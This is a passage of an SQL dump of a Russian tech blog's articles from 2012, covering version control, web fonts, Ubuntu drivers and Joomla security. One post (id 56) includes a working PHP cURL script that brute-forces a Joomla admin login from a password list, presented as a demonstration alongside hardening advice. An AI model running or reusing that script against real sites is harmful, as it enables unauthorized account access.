'/uploads/2014/02/probliema-s-ustanovkoi-sqlite-v-ubuntu-10-04.png', 1, NULL, '2012-01-10 00:08:28'),
(52, 'Bazaar - распределённая система управления версиями от Canonical Ltd.', 'bazaar-raspriedielionnaia-sistiema-upravlieniia-viersiiami-ot-canonical-ltd', '<p>Недавно занялся поиском подходящей <strong>системы контроля версий</strong>. Мотив довольно простой - при разработке различного рода проектов часто, а точнее всегда, приходится испытывать различные компоненты, плагины и пр. Порой для того чтобы реализовать нужный функционал приходится испытывать до десяти подобных программ. Уверенности в том что после удаления какой либо плагин не оставил мусора после себя нет. Еще хуже когда практикуем хаки, там последствия вообще могут быть плачевными &nbsp;- все что нажито непосильным трудом пойдет прахом. С помощью&nbsp;<strong>системы управления версиями Bazaar</strong> мы сможем вернуть нашу систему (<strong>CMS, framework, CMF</strong>) в исходное состояние всего за пару секунд.<!--more--> Для установки <strong>Bazaar</strong> воспользуемся командной строкой:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo apt-get install bzr</code></pre>\r\n\r\n<p>После чего&nbsp;перейдем&nbsp;непосредственно к делу... Итак вы установили самую свежую версию своей любимой <strong>CMS</strong> на локальный сервер, провели локализацию, и комплекс действий по умлочанию которые не вызывают особых затруднений. Теперь вы хотите запомнить состояние системы чтобы в любой момент откатиться к данному состоянию. Нет ничего проще :) <strong>Инициализируем систему контроля версий</strong> (командная строка - в Ubunutu Терминал):</p>\r\n\r\n<pre>\r\n<code class="bash">bzr init /var/www/my_project</code></pre>\r\n\r\n<p>Не забудьте указать свой путь! Следующим шагом переходим в папку с нашим проектом:</p>\r\n\r\n<pre>\r\n<code class="bash">cd /var/www/my_project</code></pre>\r\n\r\n<p>Добавляем файлы в <strong>Bazaar</strong></p>\r\n\r\n<pre>\r\n<code class="bash">bzr add</code></pre>\r\n\r\n<p>Запоминаем состояние:</p>\r\n\r\n<pre>\r\n<code class="bash">bzr commit -m &quot;Комментируем что мы уже сделали с момента последней ревизии. Комменты могут быть на русском&quot;</code></pre>\r\n\r\n<p>Готово. Теперь у нас есть сохраненное состояние которое принято называть <em>ревизией</em>. Посмотреть измененные файлы с момента последней ревизии можно с помощью команды:</p>\r\n\r\n<pre>\r\n<code class="bash">bzr status</code></pre>\r\n\r\n<p>Хотите вернуть все как было, нет проблем:</p>\r\n\r\n<pre>\r\n<code class="bash">bzr revert</code></pre>\r\n\r\n<p>Команда выше говорит о том чтобы вернуть все состояния файлов в состояние последней ревизии. Результат о проделаной работе - о ревизиях которые были проделаны можно посмотреть командой:</p>\r\n\r\n<pre>\r\n<code class="bash">bzr log</code></pre>\r\n\r\n<p>Ну и наконец, что делать если ревизия оказалась ошибочной:</p>\r\n\r\n<pre>\r\n<code class="bash">bzr uncommit</code></pre>\r\n\r\n<p>В большинстве случаев этих команд вполне достаточно для нормальной работы. Для любителей поэксперементировать или просто для тех у кого спецефические потребности - &nbsp;<a href="/uploads/2012/02/bzr-en-quick-reference.png" target="_blank">список команд <strong>Bazaar</strong></a></p>', '/uploads/2014/02/bazaar-raspriedielionnaia-sistiema-upravlieniia-viersiiami-ot-canonical-ltd.png', 1, NULL, '2012-02-09 12:08:10'),
(53, 'Нестандартные шрифты на сайте font, html, css', 'niestandartnyie-shrifty-na-saitie-font-html-css', '<p>Работая над одним из проектов столкнулся с требованием заказчика по <strong>нестандартному шрифту на сайте</strong>. Переубеждать клиента небыло смысла, т.к. шрифт органично вписывался в макет, к тому же использовался только для заголовков и некоторых типов меню что и делало его неотьемлемой частью дизайна сайта. Но как? Если клиент загружает веб страницу то он видит только те шрифты которые установлены на клиентской машине и поддержуются браузером О_о. Но так было раньше. Как выяснилось сейчас существует несколько способов задания <strong>нестандартных шрифтов на сайте</strong> - при помощи <strong>Google web fonts</strong> и <strong>свойства css @font-face</strong>. Ок, сказал я, посмотрим...<!--more-->Рассмотрим первый вариант - <strong>задание нестандартного шрифта на сайте при помощи Google web fonts.</strong> Это пожалуй лучший вариант в плане простоты и надежности, но к сожалению он уступает в гибкости второму. На момент написания статьи доступны 444 абсолютно свободных шрифтов, и этого было бы достаточно если вы делаете англоязычный сайт.&nbsp;Кириллических&nbsp;шрифтов намного меньше, сейчас их 28 :( &nbsp;Для начала <a href="http://www.google.com/webfonts" target="_blank" title="онлайн шрифты от щедрой компании Google">перейдем на сайт Google web fonts</a>&nbsp;и выберем себе шрифт по вкусу, если нужна&nbsp;кириллица&nbsp;- используем соответствующий фильтр.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2012/02/google-web-fonts.jpg" style="width: 1268px; height: 722px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">Далее жмем Quick-use и следуем инструкциям на экране. А именно:</span></p>\r\n\r\n<ul>\r\n	<li>Первый, второй шаг позволяет выбрать стили которые мы будем использовать на нашем сайте</li>\r\n	<li>Третий шаг это подключение шрифта не веб страницу. Это обычный линк на <strong>CSS</strong> файл который находится у Гугла. Я подключил код в файле <strong>header.php</strong> моего шаблона. Там уже значился стиль шаблона по умолчанию, сразу под ним и расположил данный код.</li>\r\n	<li>Теперь можно внести изменения в наши файлы стилей</li>\r\n</ul>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2012/02/google-lobster.jpg" style="width: 573px; height: 744px;" /></p>\r\n\r\n<p>Проще не придумаешь :) Переходим к способу №2 Моей жене очень нравится <a href="http://www.azfonts.ru/load_font/Aquarelle.html" target="_blank">шрифт Aquarelle</a>, именно над ним я и буду проводить&nbsp;эксперимент. Сразу оговорюсь, что для практического приминения в вебе, данный фонт совершенно не пригоден, он отлично смотрится где угодно только не на веб странице, тем не менее для примера он нам подойдет. Для этого скачаем сам <strong>шрифт</strong> и на основе его получим модификации с разными расширениями при помощи <a href="http://onlinefontconverter.com/" target="_blank">онлайн сервиса</a>. Нам понадобятся <strong>.eot .woff &nbsp;.svg</strong>&nbsp;ну и конечно же сам <strong>.ttf</strong> чтобы все браузеры смогли его отобразить. Сохраняем в одну папку на сервере. Туда же положим файл CSS:</p>\r\n\r\n<pre>\r\n<code class="css">@font-face {\r\n    font-family: &#39;Aquarelle&#39;;\r\n    src: url(&#39;Aquarelle.eot&#39;);\r\n    src: url(&#39;Aquarelle.eot?#iefix&#39;) format(&#39;embedded-opentype&#39;),\r\n         url(&#39;Aquarelle.woff&#39;) format(&#39;woff&#39;),\r\n         url(&#39;Aquarelle.ttf&#39;) format(&#39;truetype&#39;),\r\n         url(&#39;Aquarelle.svg#Aquarelle&#39;) format(&#39;svg&#39;);\r\n    font-weight: normal;\r\n    font-style: normal;\r\n}</code></pre>\r\n\r\n<p>Подключим его в файл шаблона:</p>\r\n\r\n<pre>\r\n<code class="xml">&lt;link href=&quot;&lt;?php bloginfo(&#39;stylesheet_directory&#39;); ?&gt;/Aquarelle/stylesheet.css&quot; media=&quot;screen&quot; pre=&quot;&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</code></pre>\r\n\r\n<pre lang="css">\r\n<span style="font-family: sans-serif, Arial, Verdana, ''Trebuchet MS''; line-height: 1.6em;"><img alt="" class="img-responsive" src="/uploads/2012/02/aquarelle-font.jpg" style="width: 586px; height: 706px;" />\r\nВсе! Подключаем, прописуем в </span><strong style="font-family: sans-serif, Arial, Verdana, ''Trebuchet MS''; line-height: 1.6em;">CSS</strong><span style="font-family: sans-serif, Arial, Verdana, ''Trebuchet MS''; line-height: 1.6em;"> подключенный шрифт и вуаля! Есть еще один способ - javascript библиотека Cufon. Описание есть в интернете.</span>\r\n</pre>', '/uploads/2014/02/niestandartnyie-shrifty-na-saitie-font-html-css.png', 1, NULL, '2012-02-13 02:37:34'),
(54, 'Бесшовный фон в Gimp', 'biesshovnyi-fon-v-gimp', '<p>Многие сайтописатели рано или поздно сталкиваются с проблемами <strong>кастомизации дизайна сайта</strong>. С одной стороны можно использовать шаблоны которых в интернете великое множество, поменять цвета фона, меню, шрифты и пр. Но этого не всегда оказывается достаточно. <strong>Текстуры шаблона</strong> иногда оказываются настолько уникальны и узнаваемы что говорить о индивидуальности не приходится. И тут нам в голову приходит мысль - &quot;А не сделать ли мне <strong>свою бесшовную текстуру...</strong>&quot;. Вот как раз после этих мыслей и нехитрых действий родился данный пост.<!--more--> Исходная картинка была найдена в интернете в Google картинки, по ключевому запросу &quot;Нитки&quot; и прдеставлена ниже:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2012/02/4458072220_200222c215_z.jpg" style="width: 200px; height: 267px;" /></p>\r\n\r\n<p>Пример использования такого фона можете <a href="/example/1.html" target="_blank" title="тестовая страница с шовным фоном">просмотреть на тестовой странице.</a>&nbsp;Согласитесь выглядит не очень. Для сайта нам нужен так называемый<strong> бесшовный фон</strong> - это когда переходы между текстурами&nbsp;размноженными&nbsp;браузером становятся незаметными. Для начала я взял более-менее однородный кусок из середины изображения.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2012/02/obrezka.jpg" style="width: 769px; height: 593px;" /></p>\r\n\r\n<p>Обратите внимание на размер, он должен быть кратным двум. <strong>Следующий шаг ключевой</strong>. Слой -&gt; Преобразования -&gt; Сместить... В диалоговом окне смещаем слой на половину ширины и высоты. В моем случае 260/2 = 130px</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2012/02/smeshenie.jpg" style="width: 320px; height: 394px;" /></p>\r\n\r\n<p>Должно получится следующее:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2012/02/smeshenie-rezult.jpg" style="width: 260px; height: 260px;" /></p>\r\n\r\n<p>Пока этот кусок мало пригоден к использованию но в нем края будут совпадать при размножении. Теперь нам нужно замаскировать средние переходы. Я для этого использовал штамп, кисть и лассо - для выделения и копирования текстур, вставку в пустые места.&nbsp;Вообщем&nbsp;придется&nbsp;потрудится. У меня это заняло около двух часов вместе с просмотром теле-шоу &quot;Подиум&quot; :) Получилась у меня вот такое:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2012/02/131.jpg" style="width: 260px; height: 260px;" /></p>\r\n\r\n<p>Как это выглядит<a href="/example/2.html" target="_blank"> можно посмотреть здесь.</a>&nbsp;Согласитесь&nbsp;теперь намного лучше. А если еще и текстуру взять побольше размером вообще красота будет, правда&nbsp;придется&nbsp;посидеть дольше. З.Ы.: последняя картинка не связана со всеми остальными, т.к. история в Gimp не сохранилась а только конечный вариант, но я постарался максимально точно описать порядок действий для того чтобы у вас была возможность создать свои уникальные<strong> бесшовные фоны и текстуры</strong>. Успехов!</p>', '/uploads/2014/02/biesshovnyi-fon-v-gimp.jpeg', 1, NULL, '2012-02-20 12:35:50'),
(55, 'Безопасность пароля Joomla!', 'biezopasnost-parolia-joomla', '<p>Очень важно понимать что джумла не имеет встренной системы антифлуда, поэтому если вы оставите <strong>стандартный логин admin</strong> то <strong>подбор пароля это всего лишь дело времени</strong>. Поэтому будьте внимательны и осторожны <strong>НЕ ИСПОЛЬЗУЙТЕ СТАНДАРТНЫЙ ЛОГИН ADMIN</strong>. По той же причине не стоит светить логинами пользователей на сайте с помощью встроенного модуля &quot;Кто на сайте&quot;.</p>', '/uploads/2014/02/biezopasnost-parolia-joomla.jpeg', 1, NULL, '2012-04-08 13:49:29'),
(56, 'Подбор пароля к Joomla! админке', 'podbor-parolia-k-joomla-adminkie', '<a href="http://kotoblog.pp.ua/wp-content/uploads/2012/04/pass-vk.jpg"><img class="alignleft  wp-image-263" title="pass-vk" src="http://kotoblog.pp.ua/wp-content/uploads/2012/04/pass-vk-300x300.jpg" alt="" width="202" height="202" /></a>О небезопасности дефолтного логина в Joomla! я рассказывал в предыдущей заметке. Теперь же я постараюсь показать на конкретном примере почему это так. Также расскажу каким образом можно избежать такого рода уязвимости.<!--more-->\nВо время работы над связкой Curl + SimpleHtmlDom для парсинга ВКонтакте, меня вдруг осенило. Вот пример рабочего кода перебора пароля к админке Joomla!:\n<pre lang="php">require_once ''simple_html_dom.php'';\n$url = ''http://demo15.cloudaccess.net/administrator/index.php'';\n$pass = array(''pass0'',''pass1'',''pass2'',''demo'',''pass3'',''pass4'');\n$ch = curl_init();\nforeach ($pass as $password){\n  curl_setopt($ch, CURLOPT_URL, $url);\n  curl_setopt($ch, CURLOPT_COOKIEJAR, ''cookies.txt''); // вроде куда сохранять\n  curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);\n  $out = curl_exec($ch);\n\n  $html = new simple_html_dom();\n  $html->load($out);\n  $post = ''username=demo&;passwd=''.$password.''&lang='';\n    foreach($html->find(''input[type=hidden]'') as $element)\n      $post.= ''&''.$element->name.''=''.$element->value;\n\n  curl_setopt($ch, CURLOPT_URL, $url);\n  curl_setopt($ch, CURLOPT_COOKIEFILE, ''cookies.txt''); // вроде откуда брать\n  curl_setopt($ch, CURLINFO_HEADER_OUT,true);\n  curl_setopt($ch, CURLOPT_POST, true);\n  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);\n  curl_exec($ch);\n  echo curl_error($ch);\n  $info = curl_getinfo($ch);\n  echo $password.''...''.$info[''http_code''].''<br />'';\n  if ($info[''http_code''] == 303)\n    die(''done!'');\n}\n\ncurl_close ($ch);\nunset($ch);</pre>\nМожно конечно рефакторить и оптимизировать до бесконечности, но пример робочий. Если мы захотим взломать админку простым перебором всех возможных вариантов паролей, например используя базы самых частых паролей или переберем возможные даты рождения, в сочитании с логином admin то есть вероятность того чтомы сможем подобрать пароль и никто нам в этом не помешает. Joomla! не имеет встроенной системы антифлуда, разве что хостинг, поэтому скорость перебора паролей будет зависить лишь от ширины канала и от скорости сервера.\nДля лучшей безопасности меняем логин, придумываем сложный пароль и перестаем светить логинами во френтенде. Чтобы не давать повод подумать лихого используйте <a href="http://extensions.joomla.org/extensions/access-a-security/site-security/login-protection/12254" target="_blank">jSecure</a> - он поможет скрыть админку от чужых глаз.\nПример приведен для ознакомления, не нужно его использовать для взлома - в большинстве случаев это незаконно.\nP.S.: Спасибо <a href="http://www.shtuchkishop.com/" target="_blank">Мах</a> за советы по усовершенствованию скрипта. :)', NULL, 1, NULL, '2012-04-09 20:41:26'),
(57, 'Безопасность сайта или защищаемся антивирусом на все случаи жизни', 'biezopasnost-saita-ili-zashchishchaiemsia-antivirusom-na-vsie-sluchai-zhizni', '<p>В дополнение к предыдущим постам про <a href="http://kotoblog.pp.ua/joomla/bezopasnost-parolya-joomla.html" target="_blank" title="Безопасность пароля Joomla!">безопасность пароля Joomla!</a> и <a href="http://kotoblog.pp.ua/news/podbor-parolya-k-joomla-adminke.html" target="_blank" title="Подбор пароля к Joomla! админке">подбор пароля к Joomla!</a>. В голове давно созревала идея скрипта который будет отслеживать измененные файлы на сервере. Если кто еще не знает как и зачем взламываются сайты можете <a href="http://help.yandex.ru/webmaster/?id=1071330" target="_blank" title="Безопасность сайтов по версии Яндекса">почитать на Яндексе.</a> <!--more--> Вобщем то скрипт нашелся после непродолжительного гугления, и наставления SergeyH, за что ему отдельное спасибо - <a href="http://dle-news.ru/modules/1058-zeos-antivirus.html" target="_blank" title="скрипт антивируса">ссылка на скрипт.</a> Вкратце... Скрипт умело маскируеться, теряеться среди прочих файлов вашей CMS, и отслеживает изменения тех файлов на которые вы его натравите. Отслеживает регулярно по крону, с интервалом времени который вы сами зададите. У меня на одном из сайтов на джумле, который недавно был подвергнут вирусной атаке, установленный скрипт проверяет более 6000 файлов за 1 секунду, так что можно хоть каждые 5 минут проверять. Про установку писать не буду, на сайте автора довольно подробная инструкция, и даже видео. Единственное что добавлю от себя так это про установку крона на хостинге CPanel. Находится он в Дополнительные инструмены -&gt; Планировщик задач. Для того чтобы скрипт выполнялся по крону нужно в поле command перед полым путем к скрипту указать:</p>\r\n\r\n<pre>\r\n<code class="bash">/usr/local/bin/php -f </code></pre>\r\n\r\n<p>таким образом на большинстве серверов файл будет выполнятся. В итоге получиться примерно следующее:</p>\r\n\r\n<pre>\r\n<code class="bash">/usr/local/bin/php -f /home/user/public_html/media/system/media.php</code></pre>\r\n\r\n<p>&nbsp;</p>', '/uploads/2014/02/biezopasnost-saita-ili-zashchishchaiemsia-antivirusom-na-vsie-sluchai-zhizni.gif', 1, NULL, '2012-04-22 22:53:35'),
(58, 'Кот охотник', 'kot-okhotnik', '<p>Просто чудо а не кот. Он на лету успевает мышку на вкус попробовать...</p>\r\n\r\n<div class="embeddedContent"><iframe allowfullscreen="true" allowscriptaccess="always" frameborder="0" height="349" scrolling="no" src="//www.youtube.com/embed/h_x9AUNPQ2Q?wmode=transparent&amp;jqoemcache=NcN0D" width="425"></iframe></div>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2012-05-03 09:54:29'),
(59, 'Eclipse + FTP', 'eclipse-ftp', '<p>Система Ubuntu 10.10 + Eclipse for PHP Developers (Eclipse for PHP Developers Build id: 20110301-1815) - не завелось. Может быть кому-то поможет, наверняка рецепт рабочий. Итак: <a href="http://jpablobr.com/past/install-eclipse-rse-target-management-project-plug-in" rel="nofollow" target="_blank" title="Оригинал статьи."><strong>Рецепт Eclipse + FTP</strong></a></p>', '/uploads/2014/02/eclipse-ftp.png', 1, NULL, '2012-05-05 01:53:34'),
(60, 'Аудиоплеер на сайт на javascript', 'audioplieier-na-sait-na-javascript', '<p>Понадобилось мне как то добавить плеер на свой персональный блог (да-да, есть еще и такой). И я удивился простоте реализации которую я нашел, никаких плагинов, абсолютная независимость от платформы, и пока HTML5 не вступил в оффициальную силу предлагаю следущую реализацию...<!--more--> Вчасть нашего сайта вставляем вызов самого плеера от Yahoo!</p>\r\n\r\n<pre>\r\n<code class="javascript">&lt;script type=&quot;text/javascript&quot; src=&quot;http://mediaplayer.yahoo.com/js&quot;&gt;&lt;/script&gt;</code></pre>\r\n\r\n<p>Теперь в статьях можем использовать ссылки с произвольными якорями, ссылаясь на аудио файл:</p>\r\n\r\n<pre>\r\n<code class="http">&lt;a href=&quot;http://путь/к/МР3/файлу/music.mp3&quot;&gt;Хорошая Песня&lt;/a&gt;</code></pre>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2012/05/2012-05-05-audio-player.jpg" style="width: 720px; height: 947px;" /></p>', '/uploads/2014/02/audioplieier-na-sait-na-javascript.jpeg', 1, NULL, '2012-05-05 02:22:02');
INSERT INTO `articles` (`id`, `title`, `slug`, `text`, `image`, `publish`, `weight`, `created_at`) VALUES
(61, 'Canon IP1800 в Ubuntu 10.10', 'canon-ip1800-v-ubuntu-10-10', '<p>Спасибо что есть компания Canon, что бы мы без них делали... наверное лишний час отдохнули бы от дурной работы. На этот раз сюрприз с принтером Canon IP1800 - компания &quot;забыла&quot; выпустить драйвера под Линукс. И вот опять после продолжительного гугления решение было найдено...<!--more--> <a href="http://www.ubuntubuzz.com/2011/06/download-install-canon-printer-driver.html" rel="nofollow" target="_blank">Сайт автора</a></p>\r\n\r\n<pre>\r\n<code class="bash">sudo add-apt-repository ppa:michael-gruz/canon\r\nsudo apt-get update</code></pre>\r\n\r\n<p>Далее сама установка:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo apt-get install cnijfilter-ip100series</code></pre>\r\n\r\n<p>Из всевозможных моделей:</p>\r\n\r\n<p>Canon Pixma iP Series Ubuntu driver<br />\r\nCanon iP100 Ubuntu Driver &mdash; cnijfilter-ip100series<br />\r\nCanon iP1800 Ubuntu Driver &mdash; cnijfilter-ip1800series<br />\r\nCanon iP1000 Ubuntu Driver &mdash; cnijfilter-pixmaip1000series<br />\r\nCanon iP1500 Ubuntu Driver &mdash; cnijfilter-pixmaip1500series<br />\r\nCanon iP1900 Ubuntu Driver &mdash; cnijfilter-ip1900series<br />\r\nCanon iP 2200 Ubuntu Driver &mdash; cnijfilter-ip2200series<br />\r\nCanon iP2500 Ubuntu Driver &mdash; cnijfilter-ip2500series<br />\r\nCanon iP2600 Ubuntu Driver &mdash; cnijfilter-ip2600series<br />\r\nCanon iP2700 Ubuntu Driver &mdash; cnijfilter-ip2700series<br />\r\nCanon iP3300 Ubuntu Driver &mdash; cnijfilter-ip3300series<br />\r\nCanon iP3500 Ubuntu Driver &mdash; cnijfilter-ip3500series<br />\r\nCanon iP3600 Ubuntu Driver &mdash; cnijfilter-ip3600series<br />\r\nCanon iP4200 Ubuntu Driver &mdash; cnijfilter-ip4200series<br />\r\nCanon iP4500 Ubuntu Driver &mdash; cnijfilter-ip4500series<br />\r\nCanon iP4700 Ubuntu Driver &mdash; cnijfilter-ip4700series<br />\r\nCanon iP4800 Ubuntu Driver &mdash; cnijfilter-ip4800series<br />\r\nCanon iP5200 Ubuntu Driver &mdash; cnijfilter-ip5200series<br />\r\nCanon iP6600 Ubuntu Driver &mdash; cnijfilter-ip6600series<br />\r\nCanon iP7500 Ubuntu Driver &mdash; cnijfilter-ip7500series<br />\r\nCanon Pixma MG Series Ubuntu Driver<br />\r\nCanon MG5100 Ubuntu Driver &mdash; cnijfilter-mg5100series<br />\r\nCanon MG5200 Ubuntu Driver &mdash; cnijfilter-mg5200series<br />\r\nCanon MG6100 Ubuntu Driver &mdash; cnijfilter-mg6100series<br />\r\nCanon MG8100 Ubuntu Driver &mdash; cnijfilter-mg8100series<br />\r\nCanon PIXMA MP Series Ubuntu Driver<br />\r\nCanon MP140 Ubuntu Driver &mdash; cnijfilter-mp140series<br />\r\nCanon MP160 Ubuntu Driver &mdash; cnijfilter-mp160series<br />\r\nCanon MP190 Ubuntu Driver &mdash; cnijfilter-mp190series<br />\r\nCanon MP210 Ubuntu Driver &mdash; cnijfilter-mp210series<br />\r\nCanon MP240 Ubuntu Driver &mdash; cnijfilter-mp240series<br />\r\nCanon MP490 Ubuntu Driver &mdash; cnijfilter-mp490series<br />\r\nCanon MP500 Ubuntu Driver &mdash; cnijfilter-mp500series<br />\r\nCanon MP510 Ubuntu Driver &mdash; cnijfilter-mp510series<br />\r\nCanon MP520 Ubuntu Driver &mdash; cnijfilter-mp520series<br />\r\nCanon MP540 Ubuntu Driver &mdash; cnijfilter-mp540series<br />\r\nCanon MP550 Ubuntu Driver &mdash; cnijfilter-mp550series<br />\r\nCanon MP560 Ubuntu Driver &mdash; cnijfilter-mp560series<br />\r\nCanon MP600 Ubuntu Driver &mdash; cnijfilter-mp600series<br />\r\nCanon MP610 Ubuntu Driver &mdash; cnijfilter-mp610series<br />\r\nCanon MP630 Ubuntu Driver &mdash; cnijfilter-mp630series<br />\r\nCanon MP640 Ubuntu Driver &mdash; cnijfilter-mp640series<br />\r\nCanon MX Series Ubuntu Driver<br />\r\nCanon MX320 Ubuntu Driver &mdash; cnijfilter-mx320series<br />\r\nCanon MX330 Ubuntu Driver &mdash; cnijfilter-mx330series<br />\r\nCanon MX350 Ubuntu Driver &mdash; cnijfilter-mx350series<br />\r\nCanon MX360 Ubuntu Driver &mdash; cnijfilter-mx360series<br />\r\nCanon MX410 Ubuntu Driver &mdash; cnijfilter-mx410series<br />\r\nCanon MX420 Ubuntu Driver &mdash; cnijfilter-mx420series<br />\r\nCanon MX860 Ubuntu Driver &mdash; cnijfilter-mx860series<br />\r\nCanon MX870 Ubuntu Driver &mdash; cnijfilter-mx870series<br />\r\nCanon MX880 Ubuntu Driver &mdash; cnijfilter-mx880series<br />\r\nCanon PIXUS Series Ubuntu Driver<br />\r\nPixus 550 Ubuntu Driver &mdash; cnijfilter-pixus5510iseries<br />\r\nPixus 560 Ubuntu Driver &mdash; cnijfilter-pixus560iseries<br />\r\nPixus 850 Ubuntu Driver &mdash; cnijfilter-pixus850iseries<br />\r\nPixus 860 Ubuntu Driver &mdash; cnijfilter-pixus860iseries<br />\r\nPixus 865 Ubuntu Driver &mdash; cnijfilter-pixus865iseries<br />\r\nPixus 950 Ubuntu Driver &mdash; cnijfilter-pixus950iseries<br />\r\nPixus 990 Ubuntu Driver &mdash; cnijfilter-pixus990iseries<br />\r\nCanon Pixus ip3100 Ubuntu Driver &mdash; cnijfilter-pixusip3100series<br />\r\nCanon Pixus ip4100 Ubuntu Driver &mdash; cnijfilter-pixusip4100series<br />\r\nCanon Pixus ip8600 Ubuntu Driver &mdash; cnijfilter-pixusip8600series</p>', '/uploads/2014/02/canon-ip1800-v-ubuntu-10-10.jpeg', 1, NULL, '2012-05-05 03:17:53'),
(62, 'Глобальные переменные Smarty в Prestashop', 'global-nyie-pieriemiennyie-smarty-v-prestashop', '<p>Чтобы не забыть: <br />01 $base_dir { root folder of your shop } <br />02 $base_dir_ssl { root folder of your shop using HTTPS protocol } <br />03 $content_dir { root folder of your shop depending on the SSL settings } <br />04 $img_ps_dir { root folder containing images &quot;/img/&quot; } <br />05 $img_dir { images folder in your current theme directory } <br />06 $css_dir { css folder inside the current theme folder } <br />07 $js_dir { JavaScript inside the theme folder } <br />08 $tpl_dir { theme root folder } <br />09 $modules_dir { modules root folder } <br />10 $mail_dir { mail templates root folder } <br />11 $lang_iso { current language ISO code } <br />12 $come_from { previous page address [absolute] } <br />13 $shop_name { your specified shop name } <br />14 $cart_qties { total number of products in the cart } <br />15 $cart { shopping cart contents } <br />16 $currencies { pulls available currencies } <br />17 $id_currency_cookie { selected currency id [cookie dependent] } <br />18 $currency { active currency } <br />19 $cookie { active cookie } <br />20 $languages { grabs available languages } <br />21 $logged { checks whether users is logged in } <br />22 $page_name { current page&#39;s name } <br />23 $customerName { customer name [session dependent] } <br />24 $priceDisplay { current price display settings [currency dependent] }</p>', NULL, 1, NULL, '2012-05-10 10:56:03'),
(63, 'Разбор свойств товара в модуле Многоуровневой навигации blocklayered Prestashop', 'razbor-svoistv-tovara-v-modulie-mnoghourovnievoi-navighatsii-blocklayered-prestashop', '<p>Копался на днях в <strong>Престошоповской Многоуровневой навигации (blocklayered)</strong> и наткнулся на интересснийший паттерн. Не знаю можно ли это так назвать, поправте меня если я не прав. Упрощенно можно представить так:</p>\r\n\r\n<pre>\r\n<code class="php"><!--?php\r\n$methex = TRUE; // TRUE    FALSE\r\n$inarr = FALSE;\r\n$ft = true;\r\n$ftt = FALSE;\r\n\r\nif ($methex && (!$inarr && $ft != $ftt || $ft == $ftt)) \r\n	echo TRUE;\r\nelse \r\n	echo FALSE;</code></pre>\r\n\r\n<p>Первая часть условия проверяет существует ли данный метод для заданной переменной, и если да то вход осуществляется для всех элементов массива кроме одного или только для одного элемента массива. Как то так.</p>\r\n\r\n<pre><code>Условие ИСТИНА в случае ЕСЛИ:\r\n.....Существует МЕТОД-обработчик события\r\nПрименятся в двух случаях:\r\n.....К одному элементу\r\n.....Ко всем остальным элементам\r\nКОНЕЦ ЕСЛИ.</code></pre>\r\nНа написание этого &quot;бреда&quot; меня натолкнуло \r\n\r\n<pre><code class="php">foreach ($filters as $filterTmp) { $methodName = &#39;get&#39;.ucfirst($filterTmp[&#39;type&#39;]).&#39;FilterSubQuery&#39;; if (method_exists(&#39;BlockLayered&#39;, $methodName) &amp;&amp; (!in_array($filter, array(&#39;price&#39;, &#39;weight&#39;)) &amp;&amp; $filter[&#39;type&#39;] != $filterTmp[&#39;type&#39;] || $filter[&#39;type&#39;] == $filterTmp[&#39;type&#39;])) { if ($filter[&#39;type&#39;] == $filterTmp[&#39;type&#39;] &amp;&amp; $filter[&#39;id_value&#39;] == $filterTmp[&#39;id_value&#39;]) { $subQueryFilter = self::$methodName(array(), true); echo &quot;filter-type, id_value &amp; filterTmp-type, id_value are the same!&quot;; } else { if (!is_null($filterTmp[&#39;id_value&#39;])) $selected_filters_cleaned = $this&gt;cleanFilterByIdValue(@$selectedFilters[$filterTmp[&#39;type&#39;]], $filterTmp[&#39;id_value&#39;]); else $selected_filters_cleaned = @$selectedFilters[$filterTmp[&#39;type&#39;]]; subQueryFilter = self::$methodName($selected_filters_cleaned, $filter[&#39;type&#39;] == $filterTmp[&#39;type&#39;]); } foreach ($subQueryFilter as $key =&gt; $value) $sqlQuery[$key] .= $value; } }</code></pre>\r\n\r\n<p><pre><code>@version Release: $Revision: 12927</code></pre>--></code></pre>', NULL, 0, NULL, '2012-06-04 00:01:34'),
(64, 'Конвертация изображений в многостраничный PDF', 'konviertatsiia-izobrazhienii-v-mnoghostranichnyi-pdf', '<p>Буду краток</p>\r\n\r\n<pre><code class="bash">convert im-*.jpg im.pdf</code></pre>', NULL, 1, NULL, '2012-06-06 21:36:59'),
(65, 'Установка cUrl Ubuntu 12.04', 'ustanovka-curl-ubuntu-12-04', '<p><a href="http://kotoblog.pp.ua/php/curl-php5-ubuntu-pravilnaya-ustanovka.html" title="cURL + PHP5 + Ubuntu правильная установка">В одной из своих статтей</a> я упоминал про установку cUrl на Ubuntu. С приходом 12.04 все немного изменилось. Дабы избежать проблем ставим так:</p>\r\n\r\n<pre><code class="bash">apt-get install apache2 php5 php5-json php5-gd php5-sqlite curl libcurl3 libcurl3-dev php5-curl php5-common php-xml-parser</code></pre>', NULL, 1, NULL, '2012-07-03 23:09:18'),
(66, '[РЕШЕНО] #2002 Невозможно подключиться к серверу MySQL', 'rieshieno-2002-nievozmozhno-podkliuchit-sia-k-siervieru-mysql', '<p>Лето, жара - техника не выдерживает... Раскапризничался вконец мой <strong>Dlink</strong>, пришлось сбрасывать настройки по-умолчанию дабы хоть как-то заставить его работать. После недолгих шаманств работу удалось практически полностью возобновить, почти... <strong>PhpMyAdmin</strong> наотрез отказался меня пускать все время выдавал:&nbsp;<strong>#2002 Невозможно подключиться к серверу MySQL. </strong>Команда в консоли:</p>\r\n\r\n<pre><code class="bash">mysql -u root -p</code></pre>\r\n\r\n<p>Выдала: <strong>Can&#39;t connect to local MySQL server through socket &#39;/var/run/mysqld/mysqld.sock&#39; (2)</strong> Безрезультатно поискав по форумам решения, вдруг меня осенило... После полета <strong>D-Link</strong>, на рабочей машине был изменен IP-адрес, что и привело к <strong>ошибке #2002</strong>. Зашел в настройки роутера и насильно присвоил старый IP. Проблема решена, недюсь кому-то помог, потому что в 